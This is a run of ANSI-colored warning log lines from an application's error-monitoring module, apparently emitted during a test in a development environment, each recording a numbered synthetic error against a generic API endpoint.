WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832493Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2698'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832543Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2699'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2700'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832642Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2701'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2702'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2703'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832788Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2704'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2705'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2706'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2707'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2708'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2709'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2710'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2711'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833174Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2712'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833223Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2713'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833271Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2714'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833320Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2715'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833368Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2716'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2717'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833466Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2718'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2719'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833561Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2720'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2721'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2722'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2723'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2724'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2725'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833913Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2726'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.833981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2727'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2728'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834088Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2729'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2730'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2731'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2732'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2733'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834349Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2734'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2735'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2736'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2737'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
